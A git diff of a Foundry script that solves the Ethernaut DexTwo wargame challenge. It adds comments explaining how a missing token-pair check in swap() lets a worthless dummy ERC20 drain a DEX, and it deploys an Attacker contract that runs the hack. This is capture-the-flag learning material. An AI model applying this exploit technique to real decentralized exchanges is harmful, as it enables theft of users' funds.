@@ -5,7 +5,6 @@ import {Script, console} from "forge-std/Script.sol";
 import {DexTwo} from "../src/DexTwo.sol";
 import {IERC20} from "openzeppelin-contracts-08/contracts/token/ERC20/IERC20.sol";
 
-
 contract Attacker {
 
     address token1;
@@ -34,16 +33,13 @@ contract Attacker {
     }
 }
 
-/**
- * Solution
- * 
- * Since this check from swap() method was remvoed:
- * require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
- * 
- * We can actually pass and swap any token we want. This means that we can create our own dummy ERC 20
- * with no real value and swap it for a more valuable token from the DEX.
- */
-
+/// @author agadzhalov
+/// @title Solution to DexTwo Ethernaut challenge
+/// @notice Solution:
+///         Since this check from the `swap()` method was removed:
+///         `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");`
+///         We can actually pass and swap any token we want. This means that we can create our own dummy ERC20
+///         token with no real value and swap it for a more valuable token from the DEX.
 contract DexTwoScript is Script {
 
     DexTwo dex = DexTwo(0xEe3073DAabd8c9eb86C2c0c82840C5A09F9dAa06);
@@ -54,8 +50,13 @@ contract DexTwoScript is Script {
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
+        // Deploy Attacker contract with references to both tokens and the DexTwo contract
         Attacker attacker = new Attacker(token1, token2, address(dex));
+
+        // Execute the hack
         attacker.hack();
+
+        // Log the balances of token1 and token2 in the Dex after the hack
         console.log("token1 dex balance", IERC20(token1).balanceOf(address(dex)));
         console.log("token2 dex balance", IERC20(token1).balanceOf(address(dex)));
         vm.stopBroadcast();
